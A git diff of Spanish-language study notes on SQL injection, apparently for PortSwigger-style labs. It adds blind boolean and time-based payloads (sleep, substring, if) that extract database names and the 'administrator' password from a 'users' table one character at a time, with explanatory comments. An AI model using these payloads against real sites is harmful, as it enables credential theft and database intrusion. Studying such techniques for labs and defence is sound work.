@@ -36,6 +36,7 @@ Tenemos: **DB > TABLAS > COLUMNAS > DATOS**
 **Antes de la primer coma debemos de colocar un valor que no exista en la DB. Así lo que inyectemos se podrá visualizar.**
 
 * [Cheat-Sheet-SQLI](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
 
 ## Inyecciones 'UNION' mirando el error en el Output de la Web'
 
@@ -168,15 +169,38 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ## Inyecciones Blind con respuesta condicional 
 
 -   **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)
-Cuando estas en una web a ciegas, tenemos dos formas de hacerlo, por **Tiempo** o **Condiciones**
+Cuando estas en una web a ciegas, tenemos dos formas de hacerlo, por **Tiempo** o **Boolean**.
+En las Blind también se pueden utilizar en sentencias SQL del tipo INSERT, DELETE, UPDATE, etc... 
+
+## Blind Boolean
 
 ```bash 
-# Con un 'sleep' podemos suponer que la inyeccion es de tipo 'Blind'
+# En este tipo de inyecciones te devuelve '1 = True', '0 = False', o sea, o se muestra o no se muestra 
+
+❯ and 1=1 
+
+# Forma: (Sentencia, 1, 0)=1, primero indicamos la sentencia, luego indicamos que queremos que devuelva si es verdadero (o sea 1), por ultimo que queremos que devuelva si es falso (o sea 0) 
+❯ and (if(2>1,1,0))=1       # Indicamos que 2>1, si esto es verdad entonces nos devolvera 1, por lo tanto 1=1 = True
+❯ and (if(0>1,1,0))=1       # Indicamos que 0>1, como esto no es verdad entonces nos devolvera 0, por lo tanto 0=1 = False
+
+❯ and ( if( substring(database(),1,1)='p' ,1,0))=1       # Indicamos que la primer letra de la base de datos es igual a 'p', si esto es verdad entonces entonces devolvera un 1, por lo que tendriamos 1=1 = True. El numero que debemos ir variando es el primer 1 que se encuentra al lado de 'database()' ya que este numero es el encargado de moverse al siguiente caracter en el nombre de la DB a buscar. 
+	❯ and ( if( substring(database(),2,1)='r' ,1,0))=1
+```
+
+## Blind Time 
+
+```bash 
+# Con un 'sleep' podemos suponer que la inyeccion es de tipo 'Blind' en MYSQL
 
 ❯ ' and sleep(5)-- -                                  # Haremos que tarde en responder la web 5 segundos
 ❯ ' or sleep(5)-- -                                   # Haremos que tarde en responder la web 5 segundos
 
+❯ and (select sleep(5) from <table_name> where substring(database(),1,1)='p' limit 0,1) 
+# Tardara 5 segundos si la primer letra de la primer DB es igual a 'p'
+	# limit 0,1 = Comparar con la primer DB
 ```
+
+## Blind
 
 ```bash 
 # Esto funciona cuando hay un error visual en la pagina web 
@@ -190,23 +214,27 @@ Cuando estas en una web a ciegas, tenemos dos formas de hacerlo, por **Tiempo** 
 	# Donde 0 indica la primer base de datos y es el valor que ira variando, esto dependiendo de las bases de datos que existan
 	# El segundo '1' es la posicion de la letra en cada palabra y este valor ira variando para ir avanzando a las sig. posiciones de la palabra
 	# 'A' es la letra a la que queremos igualar la consulta 
-
-Los primero dos numeros son para ir avanzando en el nombre de la base de datos, los otros dos son para ir avanzando entre las diferentes bases de datos que existan... 
 ```
 
 ```bash 
 # Encontrar el usuario de la tabla conocida 
 
-#  Confirmar cada caracter del usuario 'administrator' en la tabla 'users'
+# Si el usuario de la tabla 'users' se llama 'administrator' devuelve a, por lo tanto a=a = True
+❯ ' and (select 'a' form users where username='administrator')='a'-- -
+
+#  Confirmar cada caracter del usuario 'administrator' en la tabla 'users', el valor despues del username ira variando al momento que vayamos encontrando cada letra. 
 ❯ ' and (select substring(username,1,1) from users where username='administrator')='a' -- -  
 ❯ ' and (select substring(username,2,1) from users where username='administrator')='d' -- -
 
-# Obtener cada caracter de la password, del usuario 'adminnistrator' en la tabla 'users'
-❯ ' and (select substring(password,1,1) from users where username='administrator')='a' -- - 
 
-# Conocer la longitud de la passwd 
+# Conocer la longitud de la passwd. Si la longitud de la password es mayor a 5 y el usuario de llama 'administrator' de la tabla 'users'devuelve una 'a', por lo tanto a=a = True
 ❯ ' and (select 'a' from users where username='administrator' and length(password)>5)='a'-- -
 	# Podemos ir variando el numero hasta dar con la longitid (>,<,<=,=,>=)
+	
+
+# Obtener cada caracter de la password, del usuario 'adminnistrator' en la tabla 'users'. Si la primer letra de la password es la 'a' entonces nos dara un a=a = True, el valor despues del username ira variando al momento que vayamos encontrando cada letra. 
+❯ ' and (select substring(password,1,1) from users where username='administrator')='a' -- - 
+❯ ' and (select substring(password,2,1) from users where username='administrator')='b' -- - 
 ```
 
 ```python
